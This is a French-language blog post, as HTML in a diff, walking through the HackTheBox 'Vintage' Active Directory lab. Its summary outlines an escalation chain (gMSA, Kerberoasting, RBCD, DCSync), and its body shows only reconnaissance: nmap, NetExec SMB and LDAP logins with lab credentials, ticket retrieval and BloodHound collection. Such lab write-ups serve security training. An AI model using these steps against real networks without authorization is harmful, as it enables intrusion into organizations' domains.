@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Vintage - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/vintage/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Vintage">
+  <meta property="og:description" content="Vintage est une machine Windows de difficulté élevée conçue autour d’un scénario de compromission initiale, où l’attaquant reçoit des identifiants utilisateur à faibles privilèges. La machine présente un environnement Active Directory sans ADCS installé, et l’authentification NTLM est désactivée. Il existe un compte machine pré-créé, signifiant que le mot de passe est identique au sAMAccountName du compte machine. L’unité organisationnelle (OU) Domain Computer a une configuration permettant aux attaquants de lire le mot de passe du compte de service, qui a gMSA configuré. Après avoir obtenu le mot de passe, le compte de service peut s’ajouter à un groupe privilégié. Ce groupe a un contrôle total sur un utilisateur désactivé. L’attaquant doit restaurer l’utilisateur désactivé et définir un Service Principal Name (SPN) pour effectuer du Kerberoasting. Après récupération du mot de passe, le compte utilisateur a réutilisé le même mot de passe. L’utilisateur nouvellement compromis a un mot de passe stocké dans le Gestionnaire d’identifiants. L’utilisateur peut s’ajouter à un autre groupe privilégié configuré pour la Délégation Contrainte Basée sur les Ressources (RBCD) sur le contrôleur de domaine, permettant à l’attaquant de le compromettre.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Vintage">
+  <meta name="twitter:description" content="Vintage est une machine Windows de difficulté élevée conçue autour d’un scénario de compromission initiale, où l’attaquant reçoit des identifiants utilisateur à faibles privilèges. La machine présente un environnement Active Directory sans ADCS installé, et l’authentification NTLM est désactivée. Il existe un compte machine pré-créé, signifiant que le mot de passe est identique au sAMAccountName du compte machine. L’unité organisationnelle (OU) Domain Computer a une configuration permettant aux attaquants de lire le mot de passe du compte de service, qui a gMSA configuré. Après avoir obtenu le mot de passe, le compte de service peut s’ajouter à un groupe privilégié. Ce groupe a un contrôle total sur un utilisateur désactivé. L’attaquant doit restaurer l’utilisateur désactivé et définir un Service Principal Name (SPN) pour effectuer du Kerberoasting. Après récupération du mot de passe, le compte utilisateur a réutilisé le même mot de passe. L’utilisateur nouvellement compromis a un mot de passe stocké dans le Gestionnaire d’identifiants. L’utilisateur peut s’ajouter à un autre groupe privilégié configuré pour la Délégation Contrainte Basée sur les Ressources (RBCD) sur le contrôleur de domaine, permettant à l’attaquant de le compromettre.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vintage/" /><link rel="prev" href="http://localhost:1313/voidwhispers/" /><link rel="next" href="http://localhost:1313/unholyunion/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vintage",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/vintage\/"
+        },"genre": "posts","keywords": "Hard, Windows, Active Directory","wordcount":  2526 ,
+        "url": "http:\/\/localhost:1313\/vintage\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Vintage</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2526 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#scan-de-ports">Scan de ports</a></li>
+            <li><a href="#smb---tcp-445">SMB - TCP 445</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-cneri">Shell en tant que C.Neri</a>
+          <ul>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#récupérer-les-gmsa">Récupérer les GMSA</a></li>
+            <li><a href="#ajouter-gmsa01-dans-le-groupe-servicemanagers">Ajouter gmsa01$ dans le groupe SERVICEMANAGERS</a></li>
+            <li><a href="#activer-svc_sql">Activer svc_sql</a></li>
+            <li><a href="#targeted-kerberoasting">Targeted Kerberoasting</a></li>
+            <li><a href="#password-spray">Password Spray</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-lbianchi_adm">Shell en tant que l.bianchi_adm</a>
+          <ul>
+            <li><a href="#obtention-de-cneri_adm">Obtention de c.neri_adm</a>
+              <ul>
+                <li><a href="#dpapi">DPAPI</a></li>
+              </ul>
+            </li>
+            <li><a href="#rcbd">RCBD</a></li>
+            <li><a href="#dcsync">DCSync</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/vintage.png"
+        data-srcset="/images/Vintage/vintage.png, /images/Vintage/vintage.png 1.5x, /images/Vintage/vintage.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/vintage.png"
+        title="Vintage" width="632" height="295" /></p>
+<p>Vintage est une machine Windows de difficulté élevée conçue autour d&rsquo;un scénario de compromission initiale, où l&rsquo;attaquant reçoit des identifiants utilisateur à faibles privilèges. La machine présente un environnement Active Directory sans ADCS installé, et l&rsquo;authentification NTLM est désactivée. Il existe un <code>compte machine pré-créé</code>, signifiant que le mot de passe est identique au <code>sAMAccountName</code> du compte machine. L&rsquo;unité organisationnelle (OU) <code>Domain Computer</code> a une configuration permettant aux attaquants de lire le mot de passe du compte de service, qui a gMSA configuré. Après avoir obtenu le mot de passe, le compte de service peut s&rsquo;ajouter à un groupe privilégié. Ce groupe a un contrôle total sur un utilisateur désactivé. L&rsquo;attaquant doit restaurer l&rsquo;utilisateur désactivé et définir un <code>Service Principal Name</code> (SPN) pour effectuer du <code>Kerberoasting</code>. Après récupération du mot de passe, le compte utilisateur a réutilisé le même mot de passe. L&rsquo;utilisateur nouvellement compromis a un mot de passe stocké dans le Gestionnaire d&rsquo;identifiants. L&rsquo;utilisateur peut s&rsquo;ajouter à un autre groupe privilégié configuré pour la <code>Délégation Contrainte Basée sur les Ressources</code> (RBCD) sur le contrôleur de domaine, permettant à l&rsquo;attaquant de le compromettre.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="scan-de-ports">Scan de ports</h3>
+<p>Le scan <code>nmap</code> révèle 18 ports ouverts : <code>DNS</code>, <code>Kerberos</code>, <code>SMB</code>, <code>LDAP</code>, <code>WinRM</code> ainsi que d&rsquo;autres ports Windows.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nmap 10.129.231.205 -T4 --min-rate <span class="m">1000</span> -sV -sC -vv -p- -oN full-tcp-scan.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        syn-ack ttl <span class="m">127</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  syn-ack ttl <span class="m">127</span> Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-23 07:55:16Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">127</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vintage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vintage.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        syn-ack ttl <span class="m">127</span> .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49676/tcp open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49685/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">52879/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 0s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 57219/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 22961/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 59940/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 17035/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-07-23T07:56:08
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.231.205 vintage.htb dc01.vintage.htb dc01&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>L&rsquo;authentification NTLM est désactivée.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb 10.129.231.205 -u <span class="s1">&#39;p.rosa&#39;</span> -p <span class="s1">&#39;Rosaisbest123&#39;</span>                                                                                <span class="m">130</span> ↵
+</span></span><span class="line"><span class="cl">SMB         10.129.231.205  <span class="m">445</span>    10.129.231.205   <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.129.231.205<span class="o">)</span> <span class="o">(</span>domain:10.129.231.205<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.231.205  <span class="m">445</span>    10.129.231.205   <span class="o">[</span>-<span class="o">]</span> 10.129.231.205<span class="se">\p</span>.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED</span></span></code></pre></div></div>
+<p>J&rsquo;utilise alors l&rsquo;option <code>-k</code> pour l&rsquo;authentification Kerberos et générer un nouveau fichier <code>/etc/krb5.conf</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc01.vintage.htb -u <span class="s1">&#39;p.rosa&#39;</span> -p <span class="s1">&#39;Rosaisbest123&#39;</span> -k --generate-krb5-file /etc/krb5.conf
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\p</span>.rosa:Rosaisbest123
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  cat /etc/krb5.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">dns_lookup_kdc</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">dns_lookup_realm</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> VINTAGE.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    VINTAGE.HTB <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> dc01.vintage.htb
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> dc01.vintage.htb
+</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> vintage.htb
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    .vintage.htb <span class="o">=</span> VINTAGE.HTB
+</span></span><span class="line"><span class="cl">    vintage.htb <span class="o">=</span> VINTAGE.HTB</span></span></code></pre></div></div>
+<p>Je ne vois aucun partage particulier auquel <code>p.rosa</code> aurait accès.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc01.vintage.htb -u <span class="s1">&#39;p.rosa&#39;</span> -p <span class="s1">&#39;Rosaisbest123&#39;</span> -k --shares
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\p</span>.rosa:Rosaisbest123
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             SYSVOL          READ            Logon server share</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-cneri">Shell en tant que C.Neri</h2>
+<h3 id="bloodhound">BloodHound</h3>
+<p>Je génère alors un TGT pour <code>p.rosa</code> et je l&rsquo;exporte dans le fichier <code>KRB5CCNAME</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;vintage.htb/p.rosa:Rosaisbest123&#39;</span>                                                                                         <span class="m">130</span> ↵
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in p.rosa.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>p.rosa.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:p.rosa.ccache
+</span></span><span class="line"><span class="cl">Default principal: p.rosa@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/23/2025 10:29:09  07/23/2025 20:29:09  krbtgt/VINTAGE.HTB@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/24/2025 10:29:09</span></span></code></pre></div></div>
+<p>J&rsquo;utilise l&rsquo;option <code>--bloodhound</code> pour récupérer les relations entres les objets du domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc ldap dc01.vintage.htb -u <span class="s1">&#39;p.rosa&#39;</span> -p <span class="s1">&#39;Rosaisbest123&#39;</span> -k --bloodhound -c All --dns-server 10.129.231.205
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\p</span>.rosa:Rosaisbest123
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             Resolved collection methods: session, trusts, acl, rdp, objectprops, psremote, container, localadmin, dcom, group
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             Done in 00M 09S
+</span></span><span class="line"><span class="cl">LDAP        dc01.vintage.htb <span class="m">389</span>    DC01             Compressing output into /root/.nxc/logs/DC01_dc01.vintage.htb_2025-07-23_101054_bloodhound.zip</span></span></code></pre></div></div>
